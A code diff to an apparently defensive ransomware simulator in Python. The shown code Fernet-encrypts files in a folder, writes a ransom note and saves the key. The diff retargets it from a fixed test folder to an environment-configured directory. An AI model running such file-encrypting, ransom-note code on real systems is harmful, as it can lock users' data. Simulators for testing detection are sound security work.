@@ -1,20 +1,21 @@
-# ransomware_simulator.py
 import os
-import time
 import json
 import base64
 from datetime import datetime
 from cryptography.fernet import Fernet
+from dotenv import load_dotenv
+
+load_dotenv()
+
+
+DESTINATION_DIR = os.environ.get("WATCH_PATH", "nodes")
+TEMP_DIR = os.environ.get("TEMP_DIR", "tmp")
 
 
 class RansomwareSimulator:
     def __init__(self, encryption_key=None):
-        # Target folder is in same directory
-        self.target_folder = os.path.join(
-            os.path.dirname(os.path.abspath(__file__)),
-            "test_files",
-            "1",
-        )
+        self.target_folder = DESTINATION_DIR
+        self.key_path = os.path.join(TEMP_DIR, "decryption_key.json")
         self.key = encryption_key or Fernet.generate_key()
         self.cipher = Fernet(self.key)
         self.encrypted_files = []
@@ -25,7 +26,7 @@ class RansomwareSimulator:
         files = []
 
         if not os.path.exists(self.target_folder):
-            print(f"Creating test_files directory: {self.target_folder}")
+            print(f"Creating nodes directory: {self.target_folder}")
             os.makedirs(self.target_folder)
             return files
 
@@ -50,7 +51,7 @@ class RansomwareSimulator:
                 f.write(encrypted_data)
 
             # Create ransom note
-            ransom_note = f"""
+            ransom_note = """
 YOUR FILES HAVE BEEN ENCRYPTED!
 """
 
@@ -70,7 +71,6 @@ YOUR FILES HAVE BEEN ENCRYPTED!
 
         if not files:
             print(f"No files found in {self.target_folder}")
-            print("Add some .txt, .pdf, .json, .jpg files to test_files directory")
             return
 
         print(f"Found {len(files)} files to encrypt")
@@ -88,11 +88,10 @@ YOUR FILES HAVE BEEN ENCRYPTED!
             "timestamp": datetime.now().isoformat(),
         }
 
-        key_path = os.path.join(os.path.dirname(__file__), "decryption_key.json")
-        with open(key_path, "w") as f:
+        with open(self.key_path, "w") as f:
             json.dump(key_data, f, indent=2)
 
-        print("Decryption key saved")
+        print(f"Decryption key saved to {self.key_path}")
 
 
 def main():
